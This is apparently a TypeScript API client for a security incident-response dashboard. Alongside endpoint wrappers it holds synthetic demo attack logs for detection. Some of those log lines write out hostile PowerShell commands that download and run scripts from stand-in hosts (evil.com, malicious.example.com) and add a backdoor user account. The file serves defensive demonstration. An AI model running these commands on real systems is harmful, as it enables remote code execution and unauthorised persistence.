const ENV_API_URL = process.env.NEXT_PUBLIC_API_URL || '';

function getApiBaseCandidates(): string[] {
  const candidates: string[] = [];

  if (ENV_API_URL) candidates.push(ENV_API_URL);

  if (typeof window !== 'undefined') {
    candidates.push(`${window.location.protocol}//${window.location.hostname}:8000/api`);
  }

  candidates.push('http://localhost:8000/api');
  candidates.push('http://127.0.0.1:8000/api');

  // Deduplicate while preserving order
  return Array.from(new Set(candidates));
}

export async function fetchAPI<T>(endpoint: string, options?: RequestInit): Promise<T> {
  const isGetOrHead = !options?.method || options.method === 'GET' || options.method === 'HEAD';
  const headers: Record<string, string> = {
    ...(options?.headers as Record<string, string> | undefined),
  };

  // Only set JSON content-type when sending a body (avoids unnecessary CORS preflight for simple GETs)
  if (!isGetOrHead) {
    headers['Content-Type'] = headers['Content-Type'] || 'application/json';
  }

  const baseUrls = getApiBaseCandidates();
  let lastFetchError: Error | null = null;

  for (const baseUrl of baseUrls) {
    const url = `${baseUrl}${endpoint}`;
    try {
      const response = await fetch(url, {
        ...options,
        headers,
      });

      if (!response.ok) {
        const error = await response.json().catch(() => ({ detail: response.statusText }));
        throw new Error(error.detail || `HTTP error! status: ${response.status}`);
      }

      return await response.json();
    } catch (error) {
      if (error instanceof TypeError && error.message.includes('fetch')) {
        lastFetchError = error;
        continue;
      }
      throw error;
    }
  }

  const firstBase = baseUrls[0] || 'http://localhost:8000/api';
  throw new Error(
    `Cannot connect to backend API at ${firstBase}. Make sure the backend is running.`
  );
}

// Demo scenario log generators
export const demoScenarios = {
  brute_force: [
    '2024-01-15 10:00:00 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:01 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:02 sshd[1234]: Failed password for root from 203.0.113.45',
    '2024-01-15 10:00:03 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:04 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:05 sshd[1234]: Failed password for root from 203.0.113.45',
    '2024-01-15 10:00:06 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:07 sshd[1234]: Failed password for admin from 203.0.113.45',
    '2024-01-15 10:00:08 sshd[1234]: Failed password for root from 203.0.113.45',
    '2024-01-15 10:00:09 sshd[1234]: Accepted publickey for admin from 203.0.113.45 port 54321 ssh2',
  ],
  powershell: [
    '2024-01-15 14:30:00 powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==',
    '2024-01-15 14:30:01 powershell.exe DownloadString(\'http://malicious.example.com/script.ps1\')',
    '2024-01-15 14:30:02 powershell.exe Start-Process -FilePath cmd.exe -ArgumentList \'/c net user hacker P@ssw0rd123 /add\'',
    '2024-01-15 14:30:03 powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')',
  ],
  rdp_lateral: [
    '2024-01-15 16:45:00 TerminalServices-LocalSessionManager: User admin@CORP logged in from 192.168.1.100',
    '2024-01-15 16:45:05 TerminalServices-LocalSessionManager: User admin@CORP accessed server 192.168.1.150 from session 1',
    '2024-01-15 16:45:10 TerminalServices-LocalSessionManager: User admin@CORP executed \\\\192.168.1.150\\C$\\Windows\\System32\\cmd.exe',
    '2024-01-15 16:45:15 TerminalServices-LocalSessionManager: User admin@CORP accessed server 192.168.1.200 from session 1',
  ],
  ransomware: [
    '2024-01-15 09:15:00 file_access: Process 1234 accessed C:\\Users\\admin\\Documents\\*.docx (encryption pattern detected)',
    '2024-01-15 09:15:05 file_access: Process 1234 modified C:\\Users\\admin\\Documents\\important.docx -> important.docx.locked',
    '2024-01-15 09:15:10 registry: Process 1234 created key HKCU\\Software\\Locky\\Config',
    '2024-01-15 09:15:15 network: Process 1234 connected to 45.67.89.123:443 (Tor exit node)',
    '2024-01-15 09:15:20 file_access: Process 1234 created C:\\README_DECRYPT.txt',
  ],
  cloud_iam: [
    '2024-01-15 12:00:00 CloudTrail: AssumeRole attempted by user attacker@example.com for role AdminRole',
    '2024-01-15 12:00:01 CloudTrail: AssumeRole succeeded - user attacker@example.com assumed AdminRole',
    '2024-01-15 12:00:05 CloudTrail: CreateUser called by AdminRole for user backdoor@example.com',
    '2024-01-15 12:00:10 CloudTrail: AttachUserPolicy called - AdministratorAccess attached to backdoor@example.com',
    '2024-01-15 12:00:15 CloudTrail: CreateAccessKey called for user backdoor@example.com',
  ],
  port_scan: [
    '2024-01-15 11:30:00 firewall: Connection attempt from 203.0.113.45:54321 to 192.168.1.10:22 (blocked)',
    '2024-01-15 11:30:01 firewall: Connection attempt from 203.0.113.45:54322 to 192.168.1.10:80 (allowed)',
    '2024-01-15 11:30:02 firewall: Connection attempt from 203.0.113.45:54323 to 192.168.1.10:443 (allowed)',
    '2024-01-15 11:30:03 firewall: Connection attempt from 203.0.113.45:54324 to 192.168.1.10:3389 (blocked)',
    '2024-01-15 11:30:04 firewall: Connection attempt from 203.0.113.45:54325 to 192.168.1.10:3306 (blocked)',
    '2024-01-15 11:30:05 firewall: Connection attempt from 203.0.113.45:54326 to 192.168.1.10:8080 (blocked)',
  ],
};

export const api = {
  // ========== INCIDENTS ==========
  incidents: {
    list: (params?: { status?: string; severity?: string; limit?: number; offset?: number }): Promise<any[]> => {
      const query = new URLSearchParams();
      if (params?.status) query.append('status', params.status);
      if (params?.severity) query.append('severity', params.severity);
      if (params?.limit) query.append('limit', params.limit.toString());
      if (params?.offset) query.append('offset', params.offset.toString());
      return fetchAPI(`/incidents?${query.toString()}`);
    },
    get: (id: string): Promise<any> => fetchAPI(`/incidents/${id}`),
    update: (id: string, data: any): Promise<any> => fetchAPI(`/incidents/${id}`, {
      method: 'PUT',
      body: JSON.stringify(data),
    }),
    updateStatus: (id: string, status: string): Promise<any> => fetchAPI(`/incidents/${id}/status`, {
      method: 'PUT',
      body: JSON.stringify({ status }),
    }),
    updateActionStatus: (incidentId: string, actionId: string, status: string): Promise<any> =>
      fetchAPI(`/incidents/${incidentId}/response-plan/actions/${actionId}`, {
        method: 'PATCH',
        body: JSON.stringify({ status }),
      }),
    getStream: (id: string): Promise<any> => fetchAPI(`/incidents/${id}/stream/status`),
  },

  // ========== INGESTION ==========
  ingest: {
    analyze: (logs: string[]): Promise<any> => fetchAPI('/ingest/analyze', {
      method: 'POST',
      body: JSON.stringify(logs),
    }),
    upload: (file: File): Promise<any> => {
      const formData = new FormData();
      formData.append('file', file);
      return fetch(`${getApiBaseCandidates()[0]}/ingest/upload`, {
        method: 'POST',
        body: formData,
      }).then(res => {
        if (!res.ok) {
          return res.json().then(err => Promise.reject(new Error(err.detail || 'Upload failed')));
        }
        return res.json();
      });
    },
  },

  // ========== STREAMING ==========
  stream: {
    startAnalysis: (logs: string[], incidentId?: string): Promise<any> => fetchAPI('/v1/incidents/stream', {
      method: 'POST',
      body: JSON.stringify({ raw_logs: logs, incident_id: incidentId }),
    }),
    getIncidentStream: (incidentId: string): EventSource => {
      return new EventSource(`${getApiBaseCandidates()[0]}/v1/incidents/${incidentId}/stream`);
    },
  },

  // ========== METRICS ==========
  metrics: {
    socKPIs: (hours = 24): Promise<any> => fetchAPI(`/metrics/soc-kpis?hours=${hours}`),
    attackCoverage: (): Promise<any> => fetchAPI('/metrics/attack-coverage'),
  },

  // ========== DASHBOARD ==========
  dashboard: {
    stats: (): Promise<any> => fetchAPI('/dashboard/stats'),
  },

  // ========== HEALTH ==========
  health: {
    basic: (): Promise<any> => fetchAPI('/health/basic'),
    deep: (): Promise<any> => fetchAPI('/health/deep'),
  },

  // ========== ORGANIZATION ==========
  organization: {
    getProfile: (): Promise<any> => fetchAPI('/organization/profile'),
    updateProfile: (data: any): Promise<any> => fetchAPI('/organization/profile', {
      method: 'PUT',
      body: JSON.stringify(data),
    }),
  },

  // ========== DEBUG ==========
  debug: {
    getLastAnalysis: (incidentId: string): Promise<any> => fetchAPI(`/debug/last-analysis/${incidentId}`),
    getAgentTraces: (limit?: number): Promise<any> => fetchAPI(`/debug/agent-traces?limit=${limit ?? 20}`),
  },

  // ========== SYNTHETIC DATA ==========
  synthetic: {
    generate: (count?: number): Promise<any> => fetchAPI('/synthetic/generate', {
      method: 'POST',
      body: JSON.stringify({ count: count ?? 5 }),
    }),
  },

  // ========== SIEM ==========
  siem: {
    splunkIngest: (events: any[]): Promise<any> => fetchAPI('/siem/splunk/ingest', {
      method: 'POST',
      body: JSON.stringify(events),
    }),
    elkIngest: (events: any[]): Promise<any> => fetchAPI('/siem/elk/ingest', {
      method: 'POST',
      body: JSON.stringify(events),
    }),
    splunkExport: (incidentId?: string, limit?: number): Promise<any> =>
      fetchAPI(`/siem/splunk/export?${incidentId ? `incident_id=${incidentId}` : ''}${limit ? `&limit=${limit}` : ''}`),
    elkExport: (incidentId?: string, limit?: number): Promise<any> =>
      fetchAPI(`/siem/elk/export?${incidentId ? `incident_id=${incidentId}` : ''}${limit ? `&limit=${limit}` : ''}`),
  },

  // ========== RESPONSE ACTIONS ==========
  response: {
    blockIp: (ipAddress: string, durationHours?: number): Promise<any> =>
      fetchAPI('/response/block-ip', { method: 'POST', body: JSON.stringify({ ip_address: ipAddress, duration_hours: durationHours ?? 24 }) }),
    unblockIp: (ipAddress: string): Promise<any> =>
      fetchAPI(`/response/unblock-ip/${encodeURIComponent(ipAddress)}`, { method: 'POST' }),
    disableAccount: (username: string, reason: string): Promise<any> =>
      fetchAPI('/response/disable-account', { method: 'POST', body: JSON.stringify({ username, reason }) }),
    enableAccount: (username: string): Promise<any> =>
      fetchAPI(`/response/enable-account/${encodeURIComponent(username)}`, { method: 'POST' }),
    executePlan: (incidentId: string, responsePlan: any): Promise<any> =>
      fetchAPI('/response/execute-plan', { method: 'POST', body: JSON.stringify({ incident_id: incidentId, response_plan: responsePlan }) }),
    executionLog: (): Promise<any> => fetchAPI('/response/execution-log'),
  },

  // ========== SEMANTIC SEARCH (v1) ==========
  search: {
    semantic: (query: string, limit?: number): Promise<any> =>
      fetchAPI('/v1/incidents/search/semantic', { method: 'POST', body: JSON.stringify({ query, limit: limit ?? 10 }) }),
    mitre: (q: string, limit?: number): Promise<any> =>
      fetchAPI(`/v1/mitre/search?q=${encodeURIComponent(q)}&limit=${limit ?? 10}`),
    generateEmbedding: (incidentId: string): Promise<any> =>
      fetchAPI(`/v1/incidents/${incidentId}/generate-embedding`, { method: 'POST' }),
  },

  // ========== VALIDATION (v1) ==========
  validation: {
    incidentMetrics: (incidentId: string): Promise<any> => fetchAPI(`/v1/validate/incident/${incidentId}/metrics`),
    validateIncident: (incidentId: string): Promise<any> =>
      fetchAPI(`/v1/validate/incident/${incidentId}`, { method: 'POST' }),
    aggregate: (): Promise<any> => fetchAPI('/v1/validate/aggregate'),
  },

  // ========== PERFORMANCE (v1) ==========
  performance: {
    metrics: (): Promise<any> => fetchAPI('/v1/performance/metrics'),
  },
};
